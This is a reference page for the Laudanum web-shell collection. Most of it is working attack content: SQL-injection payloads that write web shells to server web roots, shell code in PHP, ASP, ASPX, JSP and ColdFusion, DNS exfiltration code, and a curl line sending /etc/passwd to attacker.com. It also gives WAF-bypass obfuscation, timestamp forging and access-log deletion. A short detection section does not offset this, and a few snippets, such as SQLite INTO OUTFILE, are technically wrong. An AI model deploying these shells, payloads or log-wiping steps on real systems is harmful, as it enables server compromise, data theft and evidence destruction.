---
title: "Laudanum"
slug: "laudanum"
version: "1.0"
category: "Persistence"
author: "James Jardine, John Sawyer, nidem, Secure Ideas"
license: "GPL"
repository: "https://sourceforge.net/projects/laudanum/"
kali_page: "https://www.kali.org/tools/laudanum/"
mitre_tactic: "persistence"
mitre_tactic_id: "TA0003"
description: "Collection of injectable web files for SQL injection exploitation across multiple web languages"
platforms:
  - "Cross-platform (web-based)"
tags:
  - "web-shell"
  - "sql-injection"
  - "asp"
  - "aspx"
  - "jsp"
  - "php"
  - "cfm"
  - "wordpress"
  - "persistence"
  - "post-exploitation"
---

# Laudanum

Laudanum is a collection of injectable web files designed for penetration testing when SQL injection vulnerabilities are discovered. It provides web shells, DNS query tools, LDAP retrieval utilities, and other post-exploitation functionality across multiple web languages: ASP, ASPX, JSP, PHP, ColdFusion, and WordPress.

## Overview

When a SQL injection vulnerability allows writing files to the web server (e.g., via `INTO OUTFILE`, `xp_cmdshell`, or CMS upload features), Laudanum provides ready-made web shells that can be injected to establish persistent access.

**Core Capabilities:**
- Web shells with command execution across 6 web platforms
- DNS query tools for data exfiltration
- LDAP retrieval for Active Directory environments
- File browsing and upload capabilities
- Credential harvesting tools
- WordPress-specific persistence modules

**Supported Platforms:**
- **ASP** (Active Server Pages) — IIS/Windows
- **ASPX** (ASP.NET) — IIS/Windows
- **JSP** (Java Server Pages) — Tomcat/Java
- **PHP** — Apache/Nginx/Linux
- **CFM** (ColdFusion) — ColdFusion servers
- **WordPress** — PHP-based CMS

## Installation

```bash
sudo apt update && sudo apt install -y laudanum
```

**Explanation:** Installs the Laudanum collection from Kali repositories. Files are installed to `/usr/share/laudanum/`.

### Directory Structure

```bash
ls -la /usr/share/laudanum/
```

**Output:**
```
/usr/share/laudanum
├── asp/
├── aspx/
├── cfm/
├── helpers/
├── jsp/
├── php/
└── wordpress/
```

## Dependencies

- **python3**: Required for the `laudanum` launcher script
- **kali-defaults**: Kali Linux default configuration

No web server dependencies — Laudanum provides the web files that are deployed to target servers.

## Architecture

Laudanum operates as a file collection, not a running service. The workflow is:

1. **Discovery**: Identify SQL injection vulnerability on target web application
2. **Write access**: Determine if file write is possible (INTO OUTFILE, upload, CMS admin)
3. **Selection**: Choose appropriate web shell based on server technology
4. **Injection**: Write the Laudanum file to the web root
5. **Access**: Browse to the injected file for persistent command execution

Each subdirectory contains purpose-specific tools:
- **Shell**: Command execution web interfaces
- **DNS**: DNS-based data exfiltration
- **LDAP**: Active Directory enumeration
- **File Browser**: Server file system navigation
- **Credential**: Hash dumping and credential extraction

## Usage

### Launcher

```bash
laudanum -h
```

**Explanation:** Shows the Laudanum directory structure and available tool categories.

### PHP Shell Injection

```bash
# After confirming SQL injection allows file write
# Generate PHP web shell content
cat /usr/share/laudanum/php/lvx-shell.php
```

**Explanation:** Displays the PHP web shell that can be injected via SQL injection. Copy the content for injection into the target database.

### ASP Shell for IIS

```bash
cat /usr/share/laudanum/asp/lvx-shell.asp
```

**Explanation:** ASP web shell for IIS servers. Use when the target runs Classic ASP with SQL Server.

### JSP Shell for Tomcat

```bash
cat /usr/share/laudanum/jsp/lvx-shell.jsp
```

**Explanation:** JSP web shell for Java-based web servers. Deploy via SQL injection into Oracle, MySQL, or PostgreSQL with Tomcat.

### WordPress Persistence

```bash
ls /usr/share/laudanum/wordpress/
```

**Explanation:** WordPress-specific persistence tools including plugin backdoors and theme injections.

### ColdFusion Shell

```bash
cat /usr/share/laudanum/cfm/lvx-shell.cfm
```

**Explanation:** ColdFusion web shell for CFML-based applications.

### ASPX Shell for .NET

```bash
cat /usr/share/laudanum/aspx/lvx-shell.aspx
```

**Explanation:** ASP.NET web shell for modern IIS deployments with .NET Framework.

## Injection Techniques

### MySQL INTO OUTFILE

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

**Explanation:** Writes a PHP web shell directly to the web root. Requires `FILE` privilege and known web root path.

### MySQL INTO DUMPFILE

```sql
SELECT UNHEX('3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e') 
INTO DUMPFILE '/var/www/html/shell.php';
```

**Explanation:** Writes raw hex-encoded content to avoid character encoding issues.

### SQL Server xp_cmdshell

```sql
EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^> > C:\inetpub\wwwroot\shell.aspx';
```

**Explanation:** Uses SQL Server's command execution to write ASPX files on IIS servers.

### PostgreSQL COPY

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

**Explanation:** PostgreSQL method for writing files to the filesystem via SQL injection.

### SQLite

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

**Explanation:** SQLite's limited file write capabilities for lightweight database scenarios.

## Shell Features

### Command Execution

Most Laudanum shells provide:
- **System command execution**: Run arbitrary OS commands
- **File browsing**: Navigate the server file system
- **File upload/download**: Transfer files to/from the server
- **Database interaction**: Query the underlying database

### DNS Exfiltration

When direct command output is filtered, DNS shells encode data in DNS queries:
- Data is base32/base64 encoded
- Queries sent to attacker-controlled DNS server
- Bypasses most firewall restrictions

### LDAP Retrieval

For Active Directory environments:
- Enumerate AD users and groups
- Extract domain information
- Query group policies

## Stealth Considerations

- **Filename selection**: Rename files to blend with legitimate content (e.g., `config.php.bak`, `error_log.txt`)
- **Minimal footprint**: Use the smallest shell that meets your needs
- **Access logging**: Web shells generate HTTP access logs. Consider log locations.
- **AV evasion**: Many Laudanum signatures are known to AV. Modify headers and content.
- **WAF detection**: Web Application Firewalls may detect shell patterns. Use encoding.
- **Time-based access**: Access shells only when needed to minimize log exposure

## Detection Indicators

- Unusual files in web root directories
- Web shells with `system()`, `exec()`, `eval()`, `passthru()` functions
- Files with `<?php` tags in non-PHP directories
- Unexpected ASP/JSP files in the web root
- HTTP requests to unusual filenames
- Shell command execution in web server process
- File modification timestamps inconsistent with deployments

## MITRE ATT&CK Mapping

- **T1505.003** - Server Software Component: Web Shell
- **T1505.001** - Server Software Component: SQL Stored Procedures
- **T1190** - Exploit Public-Facing Application
- **T1059.004** - Command and Scripting Interpreter: Unix Shell
- **T1059.003** - Command and Scripting Interpreter: Windows Command Shell

## Practical Scenarios

### WordPress SQL Injection to Shell

```sql
-- Step 1: Find SQL injection in WordPress
-- Step 2: Write PHP shell via UNION injection
UNION SELECT '<?php echo "<pre>"; system($_GET["c"]); echo "</pre>"; ?>' 
INTO OUTFILE '/var/www/html/wp-content/uploads/shell.php' -- -
```

**Explanation:** Injects a PHP command execution shell into WordPress uploads directory via SQL injection.

### IIS SQL Server to ASPX Shell

```sql
-- Step 1: Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-- Step 2: Write ASPX shell
EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" ValidateRequest="False" %^>^<%@ Import Namespace="System.Diagnostics" %^>^<% Process.Start(new ProcessStartInfo(Request["c"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %^> > C:\inetpub\wwwroot\shell.aspx';
```

**Explanation:** Uses SQL Server command execution to deploy an ASPX web shell on IIS.

### Tomcat JSP Shell

```sql
-- Oracle SQL injection to JSP shell
SELECT '<?jsp out.println(Runtime.getRuntime().exec(request.getParameter("c"))); ?>' 
INTO OUTFILE '/var/lib/tomcat/webapps/ROOT/shell.jsp' FROM dual;
```

**Explanation:** Deploys a JSP command execution shell on Apache Tomcat.

### DNS Exfiltration via Shell

```bash
# Access the DNS shell after injection
curl "http://192.168.1.200/shell.php?dns=attacker.com&data=$(cat /etc/passwd | base64)"
```

**Explanation:** Uses the DNS exfiltration shell to smuggle data out of a restricted network.

## Customization

### Modifying Existing Shells

```bash
# Copy a shell for modification
cp /usr/share/laudanum/php/lvx-shell.php ./my-shell.php
# Edit the shell to add custom functionality
vim ./my-shell.php
```

**Explanation:** Create custom variants by modifying the existing Laudanum templates.

### Adding Authentication

```php
// Add to shell file for basic auth
if ($_GET['key'] !== 'secret123') { die('Access denied'); }
```

**Explanation:** Add a simple authentication key to prevent unauthorized access to your shell.

## Comparison with Other Web Shells

| Feature | Laudanum | China Chopper | Weevely | B374K |
|---------|----------|---------------|---------|-------|
| Languages | ASP/ASPX/JSP/PHP/CFM | PHP/ASP/JSP | PHP | PHP |
| Stealth | Medium | Low | High | Low |
| Features | Multi-tool | Minimal | Advanced | GUI |
| Encoding | Limited | Built-in | Encoded | Basic |
| Detection | Known sigs | Known sigs | Evading | Known sigs |

## Web Shell Features in Detail

### Command Execution Shells

The primary function of Laudanum shells is providing OS command execution through the web server process:

**PHP Shell Features:**
```php
// Basic command execution
<?php system($_GET["c"]); ?>

// With output buffering for clean results
<?php 
ob_start();
system($_GET["c"]);
$output = ob_get_clean();
echo "<pre>" . htmlspecialchars($output) . "</pre>";
?>

// With error suppression
<?php @system($_GET["c"]); ?>
```

**ASP Shell Features:**
```asp
<% 
Set objShell = Server.CreateObject("WSCRIPT.SHELL")
Set objExec = objShell.Exec("cmd /c " & Request("c"))
Response.Write("<pre>" & objExec.StdOut.ReadAll & "</pre>")
%>
```

**JSP Shell Features:**
```jsp
<%
Process p = Runtime.getRuntime().exec(request.getParameter("c"));
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {
    out.println(line);
}
%>
```

### File Browser Shells

Laudanum includes file browsing capabilities:

```php
<?php
// List directory contents
if (isset($_GET["dir"])) {
    $files = scandir($_GET["dir"]);
    foreach ($files as $file) {
        echo "<a href=\"?dir={$_GET['dir']}/{$file}\">{$file}</a><br>";
    }
}

// Read file contents
if (isset($_GET["file"])) {
    echo "<pre>" . htmlspecialchars(file_get_contents($_GET["file"])) . "</pre>";
}
?>
```

### DNS Exfiltration Shells

When direct command output is blocked by WAFs or firewalls, DNS exfiltration encodes data in DNS queries:

```php
<?php
// DNS exfiltration shell
$data = shell_exec($_GET["c"]);
$encoded = base32_encode($data);
$chunks = str_split($encoded, 63); // Max DNS label length
foreach ($chunks as $i => $chunk) {
    // Send each chunk as a DNS query
    gethostbyname($chunk . "." . $_GET["dns"]);
}
?>
```

**Workflow:**
1. Command output is base32-encoded
2. Encoded data is split into DNS-label-sized chunks
3. Each chunk is sent as a subdomain query
4. Attacker's DNS server captures the queries
5. Data is reassembled from captured queries

### LDAP Retrieval Shells

For Active Directory environments:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.DirectoryServices" %>
<%
DirectoryEntry entry = new DirectoryEntry("LDAP://" + Request["dc"]);
DirectorySearcher search = new DirectorySearcher(entry);
search.Filter = "(&(objectClass=user)(name=*" + Request["q"] + "*))";
foreach (SearchResult result in search.FindAll()) {
    Response.Write(result.Properties["cn"][0] + "<br>");
}
%>
```

**Use Cases:**
- Enumerate AD users and groups
- Extract email addresses
- Map group memberships
- Find privileged accounts

## Platform-Specific Deployment

### PHP on Apache/Nginx

```bash
# Common web root locations
/var/www/html/
/srv/http/
/usr/share/nginx/html/

# Write shell via SQL injection
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/.cache.php';

# Verify access
curl "http://target.example.com/.cache.php?c=id"
```

### ASP on IIS

```bash
# Common web root locations
C:\inetpub\wwwroot\
C:\inetpub\wwwroot\admin\

# Write shell via SQL Server
EXEC xp_cmdshell 'echo ^<% Set o = Server.CreateObject("WSCRIPT.SHELL") : Response.Write o.Exec("cmd /c " & request("c")).StdOut.ReadAll %^> > C:\inetpub\wwwroot\cache.asp';

# Verify access
curl "http://target.example.com/cache.asp?c=whoami"
```

### JSP on Tomcat

```bash
# Common web root locations
/var/lib/tomcat/webapps/ROOT/
/opt/tomcat/webapps/ROOT/

# Write shell via Oracle
SELECT '<% Runtime.getRuntime().exec(request.getParameter("c")); %>' 
INTO OUTFILE '/var/lib/tomcat/webapps/ROOT/cache.jsp' FROM dual;

# Verify access
curl "http://target.example.com/cache.jsp?c=id"
```

### ColdFusion

```bash
# Common web root locations
/coldfusion/wwwroot/
/opt/coldfusion/wwwroot/

# Write shell via ColdFusion admin
<cfset filePath = ExpandPath("/") & "cache.cfm">
<cfset shellCode = '<cfexecute name="cmd" arguments="/c #URL.c#" timeout="5"><cfoutput>#cfcatch.Message#</cfoutput></cfexecute>'>
<cffile action="write" file="#filePath#" output="#shellCode#">
```

## Advanced SQL Injection Techniques

### MySQL Write with UNION

```sql
-- Standard UNION injection to write file
UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -

-- With hex encoding to avoid quotes
UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO OUTFILE '/var/www/html/shell.php' -- -
```

### SQL Server with OPENROWSET

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

-- Write file via OLE Automation
DECLARE @o INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @o OUTPUT;
EXEC sp_OAMethod @o, 'CopyFile', NULL, 'C:\temp\shell.aspx', 'C:\inetpub\wwwroot\shell.aspx';
```

### PostgreSQL Large Objects

```sql
-- Create large object with shell content
SELECT lo_create(12345);
SELECT lo_from_bytea(12345, E'\\x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e');
SELECT lo_export(12345, '/var/www/html/shell.php');
SELECT lo_unlink(12345);
```

### SQLite (Limited)

```sql
-- SQLite has limited file write capabilities
-- Primarily useful for local file operations
SELECT '<?php system($_GET["c"]); ?>' 
WHERE 1=1 INTO OUTFILE '/tmp/shell.php';
```

## WAF Bypass Techniques

### Encoding Payloads

```php
<?php
// Base64 encoded shell
eval(base64_decode('c3lzdGVtKCRfR0VUWyJjIl0pOw=='));
?>
```

### Character Substitution

```php
<?php
// Use variable functions to avoid detection
$f = 'sys' . 'tem';
$f($_GET["c"]);
?>
```

### Null Byte Injection

```php
<?php
// Null bytes can bypass some filters
system($_GET["c"] . "\0");
?>
```

### Unicode Encoding

```php
<?php
// Unicode characters may bypass WAF rules
$s = chr(115) . chr(121) . chr(115) . chr(116) . chr(101) . chr(109);
$s($_GET["c"]);
?>
```

## Defense Evasion

### File Timestamp Manipulation

```bash
# After deploying shell, modify timestamps
touch -r /var/www/html/index.php /var/www/html/.cache.php

# Or use specific timestamps
touch -t 202301011200 /var/www/html/.cache.php
```

### Access Log Cleanup

```bash
# Remove shell access from logs
# Apache
sed -i '/\.cache\.php/d' /var/log/apache2/access.log

# Nginx
sed -i '/\.cache\.php/d' /var/log/nginx/access.log
```

### Process Name Camouflage

```bash
# Rename the shell process
# (requires exec() in shell)
mv /var/www/html/shell.php /var/www/html/.htaccess
```

## Detection Signatures

### Common Indicators

```php
// These patterns trigger detection:
system($_GET[      // PHP system call
exec($_POST[       // PHP exec call
passthru($_GET[    // PHP passthru call
eval($_POST[       // PHP eval (dangerous)
shell_exec($_GET[  // PHP shell_exec
base64_decode(     // Obfuscation
```

### Network Signatures

```
# HTTP Request Patterns
GET /shell.php?c=
POST /shell.php?cmd=
GET /cache.php?id=

# Response Patterns
<pre>uid=0(root)
root:x:0:0
/bin/bash
```

### File System Monitoring

```bash
# Monitor web root for new files
inotifywait -m /var/www/html/

# Check for recently modified files
find /var/www/html -type f -mmin -60

# Find files with suspicious content
grep -r "system\|exec\|passthru" /var/www/html/
```

## Comparison with Other Web Shells

| Feature | Laudanum | China Chopper | Weevely | B374K |
|---------|----------|---------------|---------|-------|
| Languages | ASP/ASPX/JSP/PHP/CFM | PHP/ASP/JSP | PHP | PHP |
| Stealth | Medium | Low | High | Low |
| Features | Multi-tool | Minimal | Advanced | GUI |
| Encoding | Limited | Built-in | Encoded | Basic |
| Detection | Known sigs | Known sigs | Evading | Known sigs |
| Size | ~5-20KB | ~1-2KB | ~20KB | ~50KB |
| Auth | None (add custom) | Password | Encrypted | Password |
| Tunneling | DNS | HTTP | Encrypted HTTP | HTTP |

## Related Tools

- **weevely**: Advanced PHP web shell with encrypted communication
- **webacoo**: Web shell in PHP with cookie-based authentication
- **webshells**: Kali's broader web shell collection
- **chisel**: HTTP tunnel for bypassing firewalls (complementary technique)
- **sqlmap**: Automated SQL injection to identify injection points
- **commix**: Command injection exploitation tool
- **phpspy**: PHP backdoor with file manager
- **b374k**: PHP web shell with GUI interface
- **wso**: Web Shell by Orb

## Resources

- [SourceForge Project](https://sourceforge.net/projects/laudanum/)
- [Laudanum Website](https://laudanum.sourceforge.io/)
- [Kali Linux Package](https://www.kali.org/tools/laudanum/)
- [OWASP Web Shells](https://owasp.org/www-community/attacks/Web_Shell)
- [MITRE ATT&CK TA0003](https://attack.mitre.org/tactics/TA0003/)
